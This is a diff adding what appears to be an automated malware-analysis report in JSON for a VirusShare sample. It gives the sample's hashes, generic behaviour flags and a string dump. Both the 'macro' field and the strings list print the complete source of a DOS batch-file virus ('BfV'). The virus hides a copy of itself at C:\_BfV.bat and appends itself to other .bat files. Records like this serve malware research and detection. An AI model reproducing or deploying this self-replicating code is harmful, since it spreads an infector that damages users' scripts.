@@ -1,0 +1,57 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "call": "May call a DLL using Excel 4 Macros",
+            "command": "May run PowerShell commands",
+            "run": "May run an executable file or a system command"
+        },
+        "macro": "@echo off%[BfV_B]%\nif '%1=='## goto BfV_%2\nif exist C:\\_BfV.bat goto BfV_\nif not exist %0.bat goto BfV_end\nfind \"BfV\"<%0.bat>C:\\_BfV.bat\nattrib C:\\_BfV.bat +h\n:BfV_\ncommand /e:5000 /c C:\\_BfV ## run\ngoto BfV_end\n:BfV_run\nfor %%i in (*.bat ..\\*.bat) do call C:\\_BfV ## inf %%i\nexit BfV\n:BfV_inf\nif '%BfV%=='1111111 exit\nset BfV=%BfV%1\nfind \"BfV\"<%3>nul\nif not errorlevel 1 goto BfV_end\ntype %3>BfV\ntype C:\\_BfV.bat>>BfV\nmove BfV %3>nul\nexit BfV\n:BfV_end"
+    },
+    "filename": "VirusShare_4a6b0212f02306ea0f31160a43754565",
+    "filesize": 475,
+    "filetype": "DOS batch file, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "4a6b0212f02306ea0f31160a43754565",
+        "sha1": "6c9b1b06531ec5e75e71b9ef9bbc05c99e128098",
+        "sha256": "a756c9954bd830058fed3c67d9791fb09fa04e505beb9a2003f277d5b9894c05"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off%[BfV_B]%",
+            "if '%1=='## goto BfV_%2",
+            "if exist C:\\_BfV.bat goto BfV_",
+            "if not exist %0.bat goto BfV_end",
+            "find \"BfV\"<%0.bat>C:\\_BfV.bat",
+            "attrib C:\\_BfV.bat +h",
+            ":BfV_",
+            "command /e:5000 /c C:\\_BfV ## run",
+            "goto BfV_end",
+            ":BfV_run",
+            "for %%i in (*.bat ..\\*.bat) do call C:\\_BfV ## inf %%i",
+            "exit BfV",
+            ":BfV_inf",
+            "if '%BfV%=='1111111 exit",
+            "set BfV=%BfV%1",
+            "find \"BfV\"<%3>nul",
+            "if not errorlevel 1 goto BfV_end",
+            "type %3>BfV",
+            "type C:\\_BfV.bat>>BfV",
+            "move BfV %3>nul",
+            "exit BfV",
+            ":BfV_end"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.276012",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
